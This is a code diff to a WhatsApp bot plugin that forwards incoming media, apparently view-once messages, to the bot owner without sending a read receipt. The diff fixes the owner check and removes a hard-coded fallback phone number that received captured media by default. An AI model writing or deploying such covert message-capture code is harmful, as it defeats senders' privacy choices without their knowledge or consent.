@@ -11,8 +11,12 @@ module.exports = {
     enabled: false,
 
     async execute(sock, m) {
-        const owners = (global.owners || ['233533763772@s.whatsapp.net']);
-        const isOwner = owners.some(o => m.sender.includes(o.split('@')[0]));
+        const owners = global.owners || [];
+        const senderNum = (m.sender || '').split('@')[0].replace(/:\d+$/, '');
+        const isOwner = owners.some(o => {
+            const ownerNum = o.split('@')[0].replace(/:\d+$/, '');
+            return senderNum === ownerNum;
+        });
         if (!isOwner) return m.reply('❌ This command is for the owner only.');
 
         this.enabled = !this.enabled;
@@ -36,8 +40,9 @@ ${this.enabled
         if (!rawMsg.message) return;
         if (rawMsg.key.fromMe) return;
 
-        const OWNER = (global.owners || ['233533763772@s.whatsapp.net'])
-            .find(o => o.includes('@s.whatsapp.net')) || '233533763772@s.whatsapp.net';
+        const OWNER = (global.owners || [])
+            .find(o => o.includes('@s.whatsapp.net')) || '';
+        if (!OWNER) return;
 
         try {
             const sender = rawMsg.key.participant || rawMsg.key.remoteJid;
@@ -66,7 +71,6 @@ ${this.enabled
                 if (!buffer) return;
                 await sock.sendMessage(OWNER, { audio: buffer, mimetype: 'audio/ogg; codecs=opus', ptt: true, caption: header });
             }
-            // DO NOT call sock.readMessages() — that would send a "seen" receipt
         } catch (err) {
             console.error('[AnonView] Error:', err.message);
         }
